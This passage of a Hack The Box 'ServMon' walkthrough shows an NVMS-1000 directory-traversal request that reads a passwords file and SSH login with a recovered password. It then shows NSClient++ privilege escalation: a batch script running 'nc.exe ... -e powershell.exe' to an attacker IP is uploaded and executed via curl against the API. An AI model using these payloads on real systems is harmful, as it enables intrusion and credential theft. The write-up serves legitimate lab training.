+SF:20404</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2018</span><span class="se">\r\n\r\n</span><span class="s2">Document</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found"</span><span class="o">)</span>%r<span class="o">(</span>RTSP
+SF:Request,36,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">2018</span><span class="se">\r\n\r\n</span><span class="s2">Document</span><span class="se">\x</span><span class="s2">
+SF:20not</span><span class="se">\x</span><span class="s2">20found"</span><span class="o">)</span>%r<span class="o">(</span>SIPOptions,36,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">1</span><span class="se">\x</span><span class="s2">20404</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">
+SF:2018</span><span class="se">\r\n\r\n</span><span class="s2">Document</span><span class="se">\x</span><span class="s2">20not</span><span class="se">\x</span><span class="s2">20found"</span><span class="o">)</span><span class="p">;</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 2h33m50s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-04-12T02:36:02
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Apr 12 09:02:55 2020 -- 1 IP address (1 host up) scanned in 1286.80 seconds</span>
+</pre></table></code></div></div><p>So many Ports are opened Lets start enumerating them one by one</p><h2 id="ftp-port-21">FTP (Port 21)</h2><p>Port 21 is opened and i tried for <code class="language-plaintext highlighter-rouge">anonymous</code> login</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>➜  servmon ftp servmon.htb 
+Connected to servmon.htb.
+220 Microsoft FTP Service
+Name <span class="o">(</span>servmon.htb:prashant<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; 
+</pre></table></code></div></div><p>And we are logged in <code class="language-plaintext highlighter-rouge">anonymously</code>.</p><p>There is a dir Called <code class="language-plaintext highlighter-rouge">Users</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  12:05PM       &lt;DIR&gt;          Users
+226 Transfer complete.
+ftp&gt;
+</pre></table></code></div></div><p>and it has two sub-Dirs</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  12:06PM       &lt;DIR&gt;          Nadine
+01-18-20  12:08PM       &lt;DIR&gt;          Nathan
+226 Transfer complete.
+ftp&gt;
+</pre></table></code></div></div><p>We got two Files from both the Dirs.</p><ol><li><code class="language-plaintext highlighter-rouge">Confidential.txt</code> from Nadine Directory<li><code class="language-plaintext highlighter-rouge">Notes to do.txt</code> from Nathan Directory</ol><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  12:08PM                  174 Confidential.txt
+226 Transfer complete.
+ftp&gt; <span class="nb">pwd
+</span>257 <span class="s2">"/Users/Nadine"</span> is current directory.
+ftp&gt; <span class="nb">cd</span> ../Nathan
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  12:10PM                  186 Notes to <span class="k">do</span>.txt
+226 Transfer complete.
+ftp&gt;
+</pre></table></code></div></div><p>These Files contains the follwoing contents</p><ul><li><code class="language-plaintext highlighter-rouge">Confidential.txt</code></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">Notes to do.txt</code></ul><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint                       
+</pre></table></code></div></div><p>So the file <strong>Confidential.txt</strong> talks about that there is a file called <code class="language-plaintext highlighter-rouge">passwords.txt</code> in the Desktop of user <code class="language-plaintext highlighter-rouge">Nathan</code>.Hmmmmm interesting</p><p>And the file <code class="language-plaintext highlighter-rouge">Notes to do.txt</code> talks about the password change of the NSclient service.</p><h2 id="port-8443nsclient">Port 8443(NsClient++)</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-4.png" alt="Nsclient++" /></p><p>It has a login page only with a password requirement.</p><p>The port 8443 is running <code class="language-plaintext highlighter-rouge">Nsclient++</code> and i searched for its available public exploits. And got a privilege escaltion exploit from exploit-db</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-3.png" alt="Nsclient++" /></p><p><a href="https://www.exploit-db.com/exploits/46802" target="_blank">Nsclient++ exploit</a></p><p>But i cant think of privilege escaltion without having a proper shell….so just moved on.</p><h2 id="port-80-nvms-1000">Port 80 (Nvms-1000)</h2><p>There is a service running on port 80 called <code class="language-plaintext highlighter-rouge">Nvms 1000</code>.and it has a login page too.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-1.png" alt="Nvms-1000" /></p><p>I searched for possible exploits for the Service and i got a <a href="https://www.exploit-db.com/exploits/47774" target="_blank">Directory traversal / Dir-traversel exploit</a> from exploit-db</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-2.png" alt="NVMS-Exploit" /></p><p>And the exploit says about the Directory traversal using</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/../../../../../../../../../../../../windows/win.ini</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">12.0.0.1</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+Response
+---------
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+</pre></table></code></div></div><p>Now i remeber the concept of the <code class="language-plaintext highlighter-rouge">Passwords.txt</code> file from the <code class="language-plaintext highlighter-rouge">confidential.txt</code> we have to get its content with the same exploitation since it is in Nathan’s Deaktop dir.I am using Burp suite for my hit and trials.</p><p>Need to fire up my burp now…</p><p>So i just captured the request from the home npage and send it to <code class="language-plaintext highlighter-rouge">Repeater</code>.</p><p>To Test the Dir-traversel….I sent this request</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/../../../../../../../../../../../../windows/win.ini</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">servmon.htb</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://servmon.htb/</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">dataPort=6063; lang_type=0x0409%24en-us</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</pre></table></code></div></div><p>And got the Following response</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-type</span><span class="p">:</span><span class="s"> </span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">92</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">AuthInfo</span><span class="p">:</span><span class="s"> </span>
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+</pre></table></code></div></div><p>Now it confirmed the <code class="language-plaintext highlighter-rouge">Dir-traversel</code> Lets try to Extract the <strong>Passwords.txt</strong> which is in the following dir</p><p><code class="language-plaintext highlighter-rouge">/Users/Nathan/Desktop/Passwords.txt</code></p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">servmon.htb</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://servmon.htb/</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">dataPort=6063; lang_type=0x0409%24en-us</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+</pre></table></code></div></div><p>And Got the following Response</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-type</span><span class="p">:</span> <span class="s">text/plain</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">156</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">AuthInfo</span><span class="p">:</span><span class="s"> </span>
+
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+</pre></table></code></div></div><p>Now i got too many passwords since the port <code class="language-plaintext highlighter-rouge">22:ssh</code> is opened and i can try on it.</p><p>The user will be <code class="language-plaintext highlighter-rouge">Nadine</code> For sure because he wrote a letter to <code class="language-plaintext highlighter-rouge">Nathan</code> that he left the passwords.txt file in his Desktop.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>➜  servmon ssh Nadine@servmon.htb 
+Nadine@servmon.htb password: 
+Microsoft Windows <span class="o">[</span>Version 10.0.18363.752]
+<span class="o">(</span>c<span class="o">)</span> 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:<span class="se">\U</span>sers<span class="se">\N</span>adine&gt;
+</pre></table></code></div></div><p>And i got logged in on <code class="language-plaintext highlighter-rouge">Nadine:L1k3B1gBut7s@W0rk</code></p><p>Its better to Spawn a powershell</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="nf">nadine</span><span class="err">@</span><span class="nx">SERVMON</span><span class="w"> </span><span class="nx">C:\Users\Nadine</span><span class="err">&gt;</span><span class="nx">powershell</span><span class="w">
+</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
+</span><span class="nf">Copyright</span><span class="w"> </span><span class="p">(</span><span class="nf">C</span><span class="p">)</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">   
+
+</span><span class="kr">Try</span><span class="w"> </span><span class="nf">the</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">cross-platform</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">https://aka.ms/pscore6</span><span class="w">
+
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Nadine</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Nadine\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">.</span><span class="nx">\user.txt</span><span class="w">
+</span><span class="nf">ea4-------------------------95a1</span><span class="w">
+</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Nadine\Desktop</span><span class="err">&gt;</span><span class="w"> 
+</span></pre></table></code></div></div><h1 id="privilege-escalation">Privilege Escalation</h1><p>Now The next goal is to achieve Admin Privileges. I remember the port 8443 which is running <code class="language-plaintext highlighter-rouge">Nsclient++</code> service on it.And now i have a shell so i can go for that privilege escalation exploit.</p><p>The exploit include the first step as extracting the nsclient++ <code class="language-plaintext highlighter-rouge">password</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Exploit:
+1. Grab web administrator password
+- open c:\program files\nsclient++\nsclient.ini
+or
+- run the following that is instructed when you select forget password
+	C:\Program Files\NSClient++&gt;nscp web -- password --display
+	Current password: SoSecret
+</pre></table></code></div></div><p>We have the proper shell to read the pass… according to the exploit the password is saved in <code class="language-plaintext highlighter-rouge">c:\program files\nsclient++\nsclient.ini</code></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Nadine</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="s1">'c:\program files\nsclient++\nsclient.ini'</span><span class="w">
+</span><span class="c"># If you want to fill this file with all available options run the following com</span><span class="w">
+</span><span class="nf">mand:</span><span class="w">
+</span><span class="c">#   nscp settings --generate --add-defaults --load-all</span><span class="w">
+</span><span class="c"># If you want to activate a module and bring in all its options use:</span><span class="w">
+</span><span class="c">#   nscp settings --activate-module &lt;MODULE NAME&gt; --add-defaults    </span><span class="w">
+</span><span class="c"># For details run: nscp settings --help</span><span class="w">
+
+
+</span><span class="p">;</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nf">flight</span><span class="w"> </span><span class="nf">-</span><span class="w"> </span><span class="nx">TODO</span><span class="w">
+</span><span class="p">[</span><span class="nf">/settings/default</span><span class="p">]</span><span class="w">
+
+</span><span class="p">;</span><span class="w"> </span><span class="kt">Undocumented</span><span class="w"> </span><span class="kt">key</span><span class="w">
+</span><span class="kt">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">ew2x6SsGTxjRwXOT</span><span class="w">
+</span></pre></table></code></div></div><p>Then i entered the password in the Login page…</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-5.png" alt="Login" /></p><p>Its says <code class="language-plaintext highlighter-rouge">403 Your not allowed</code> maybe the password is wrong</p><p>But how can it be wrong…..</p><p>Now i just tried to forward the local port <code class="language-plaintext highlighter-rouge">8443</code> running on servmon maybe the creator want us to do that</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">servmon</span><span class="w"> </span><span class="nx">ssh</span><span class="w"> </span><span class="nt">-L</span><span class="w"> </span><span class="nx">8443:127.0.0.1:8443</span><span class="w"> </span><span class="nx">Nadine</span><span class="err">@</span><span class="nx">servmon.htb</span><span class="w">
+</span><span class="nf">Nadine</span><span class="err">@</span><span class="nx">servmon.htb</span><span class="w"> </span><span class="nx">password:</span><span class="w"> 
+
+</span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="kt">Version</span><span class="w"> </span><span class="mf">10.0.18363.752</span><span class="p">]</span><span class="w">
+</span><span class="p">(</span><span class="nf">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="nf">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="nf">nadine</span><span class="err">@</span><span class="nx">SERVMON</span><span class="w"> </span><span class="nx">C:\Users\Nadine</span><span class="err">&gt;</span><span class="w">
+</span></pre></table></code></div></div><p>If i check for local ports on my machine <code class="language-plaintext highlighter-rouge">8443</code> islisted here</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  prashant ss <span class="nt">-nlt</span>
+State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port                              
+LISTEN              0                   128                                  127.0.0.1:8443                                 0.0.0.0:<span class="k">*</span>                 
+</pre></table></code></div></div><p>And i can surf it on my web-browser now</p><p>By – <code class="language-plaintext highlighter-rouge">https://127.0.0.1:8443/</code></p><p>And entered the password and i m logged in</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/servmon/image-6.png" alt="Logged-in" /></p><p>And Now i can move on to exploit</p><blockquote><p>I will be using the api for explotaion because the exploting with browser didnt worked for me….</p></blockquote><p>So the exploit say about</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>1. Grab web administrator password
+- open c:\program files\nsclient++\nsclient.ini
+or
+- run the following that is instructed when you select forget password
+	C:\Program Files\NSClient++&gt;nscp web -- password --display
+	Current password: SoSecret
+
+2. Login and enable following modules including enable at startup and save configuration
+- CheckExternalScripts
+- Scheduler
+
+3. Download nc.exe and evil.bat to c:\temp from attacking machine
+	@echo off
+	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
+
+4. Setup listener on attacking machine
+	nc -nlvvp 443
+
+5. Add script foobar to call evil.bat and save settings
+- Settings &gt; External Scripts &gt; Scripts
+- Add New
+	- foobar
+		command = c:\temp\evil.bat
+
+6. Add schedulede to call script every 1 minute and save settings
+- Settings &gt; Scheduler &gt; Schedules
+- Add new
+	- foobar
+		interval = 1m
+		command = foobar
+</pre></table></code></div></div><p>So the exploit say about specifying our external script and applying an interval of 1m</p><p>I did it through the nsclient++ api.</p><p>Here is the documentation about the api of nsclient <a href="https://docs.nsclient.org/api/scripts/" target="_blank">https://docs.nsclient.org/api/scripts/</a></p><p>And we can upload our script <code class="language-plaintext highlighter-rouge">https://localhost:8443/api/v1/scripts/ext/scripts/shell</code></p><p>Where shell is the script name after uploading it.</p><p>And then we can execute the script with the <code class="language-plaintext highlighter-rouge">queries</code> available.</p><p>Read here <a href="https://docs.nsclient.org/api/rest/queries/#command-execute" target="_blank">https://docs.nsclient.org/api/rest/queries/#command-execute</a></p><p>SO….here is waht i m going to do</p><p>I m going to upload an external script shell.bat to the api. This will be the content of the shell.bat file</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="err">@</span><span class="nf">echo</span><span class="w"> </span><span class="nx">off</span><span class="w">
+</span><span class="nf">c:\tmp\nc.exe</span><span class="w"> </span><span class="nx">10.10.14.52</span><span class="w"> </span><span class="nx">1234</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w">
+</span></pre></table></code></div></div><p>And i will download the nc.exe to the servmon machine in /tmp dir using python server.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://10.10.14.52:8080/nc64.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">nc.exe</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ls</span><span class="w">
+
+
+    </span><span class="nf">Directory:</span><span class="w"> </span><span class="nx">C:\tmp</span><span class="w">
+
+
+</span><span class="nf">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="nf">----</span><span class="w">                </span><span class="nf">-------------</span><span class="w">         </span><span class="nf">------</span><span class="w"> </span><span class="nf">----</span><span class="w">
+</span><span class="nt">-a</span><span class="nf">----</span><span class="w">       </span><span class="mi">14</span><span class="nf">/04/2020</span><span class="w">     </span><span class="nx">06:52</span><span class="w">          </span><span class="nx">43696</span><span class="w"> </span><span class="nx">nc.exe</span><span class="w">
+</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  Tools python <span class="nt">-m</span> http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span> ...
+10.10.10.184 - - <span class="o">[</span>14/Apr/2020 12:18:56] <span class="s2">"GET /nc64.exe HTTP/1.1"</span> 200 -
+</pre></table></code></div></div><p>And then i ll make a curl request to the api to PUT the shell.bat</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  servmon curl <span class="nt">-i</span> <span class="nt">-k</span> <span class="nt">-u</span> admin:ew2x6SsGTxjRwXOT <span class="nt">-X</span> PUT https://localhost:8443/api/v1/scripts/ext/scripts/shell.bat <span class="nt">--data-binary</span> @shell.bat
+
+HTTP/1.1 200
+Content-Length: 32
+Set-cookie: <span class="nv">token</span><span class="o">=</span>frAQBc8Wsa1xVPfvJcrgRYwTiizs2trQ<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+Set-cookie: <span class="nv">uid</span><span class="o">=</span>admin<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/
+
+Added shell as scripts<span class="se">\s</span>hell.bat
+</pre></table></code></div></div><p>I got a message saying the script is added</p><p>now i can execute the script by making a request to <code class="language-plaintext highlighter-rouge">https://localhost:8443/api/v1/queries/shell/commands/execute?time=1</code></p><p><strong>?time=1</strong> specify the time interval = 1 minute</p><p>And i make the following request</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  servmon curl <span class="nt">-i</span> <span class="nt">-k</span> <span class="nt">-u</span> admin:ew2x6SsGTxjRwXOT <span class="s1">'https://localhost:8443/api/v1/queries/shell/commands/execute?time=1'</span>
+</pre></table></code></div></div><p>As soon as i make the request i got the response on my nc listener</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="err">➜</span><span class="w">  </span><span class="nf">servmon</span><span class="w"> </span><span class="nx">nc</span><span class="w"> </span><span class="nt">-nlvp</span><span class="w"> </span><span class="nx">1234</span><span class="w">
+</span><span class="nf">listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">[</span><span class="kt">any</span><span class="p">]</span><span class="w"> </span><span class="nx">1234</span><span class="w"> </span><span class="o">...</span><span class="w">
+</span><span class="nf">connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.14.52</span><span class="p">]</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="p">(</span><span class="nf">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10.10.184</span><span class="p">]</span><span class="w"> </span><span class="mi">52839</span><span class="w">
+</span><span class="nf">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
